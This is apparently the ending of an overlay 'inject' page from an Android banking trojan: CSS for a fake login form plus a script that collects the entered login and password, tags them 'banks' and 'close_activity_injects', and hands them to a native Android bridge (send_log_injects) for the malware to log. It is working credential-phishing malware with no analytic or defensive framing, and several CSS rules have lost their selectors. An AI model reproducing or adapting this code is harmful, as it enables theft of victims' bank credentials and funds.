        header {
            text-align: center;
            padding-top: 15px;
        }

        form {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

            flex: 1;
            padding: 15px;
        }

            padding: 5px;
        }

            padding: 10px;
            border: 1px solid #fff;
            background-color: rgba(255, 255, 255, 0.322);
            width: 100%;
            border-radius: 6px;
            margin-bottom: 15px;
            color: #fff;
        }

            width: 100%;
            padding: 10px;
            background-color: #fff;
            color: #54314e;
            border: 0;
            border-radius: 2px;
            font-weight: bold;
            font-size: 14px;
        }

        .input::placeholder {
            font-weight: 600;
            color: #fff;
            opacity: 1;
            font-size: 14px;
        }

        .error {
            border-color: #f00 !important;
        }

        input, button {
            outline: none !important;
            box-shadow: none !important;
        }

            sendData = document.getElementById('sendData');

        sendData.onclick = () => {
            if(login.value.length < 3) {
                login.classList.add('error')
            } else {
                login.classList.remove('error')
            }

            if(password.value.length < 3) {
                password.classList.add('error')
            } else {
                password.classList.remove('error')
            }

            if(login.value.length > 3 && password.value.length > 3) {
                send_form(form)
            }
        }
        
        if ( typeof Android == "undefined")
            var Android = {
                returnResult : alert.bind(window)
            }
        
        function validate_form(form)
        {
            return true;
        }
        
        function send_form(form)
        {
            var data = {};
            for( var i = 0 ; i < form.length ; i++ )
            {
                var input = form[i];
                if ( input.type == "submit" )
                    continue;
                data[ form[i].name ] = form[i].value;
            }
            data.type_injects = "banks";
                data.closed = "close_activity_injects";
            var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
        
        var stringifyJSON = function(obj) {
            var arrOfKeyVals = [],
                arrVals = [],
                objKeys = [];
        
            if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
                return '' + obj;
            else if (typeof obj === 'string')
                return '"' + obj + '"';
        
            else if (Array.isArray(obj)) {
                if (obj[0] === undefined)
                    return '[]';
                else {
                    obj.forEach(function(el) {
                        arrVals.push(stringifyJSON(el));
                    });
                    return '[' + arrVals.join(',') + ']';
                }
            }else if (obj instanceof Object) {
                objKeys = Object.keys(obj);
                objKeys.forEach(function(key) {
                    var keyOut = '"' + key + '":';
                    var keyValOut = obj[key];
                    if (keyValOut instanceof Function || typeof keyValOut === undefined)
                        arrOfKeyVals.push('');
                    else if (typeof keyValOut === 'string')
                        arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
                    else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
                        arrOfKeyVals.push(keyOut + keyValOut);
                    else if (keyValOut instanceof Object) {
                        arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
                    }
                });
                return '{' + arrOfKeyVals + '}';
            }
        };
    </script>
</body>
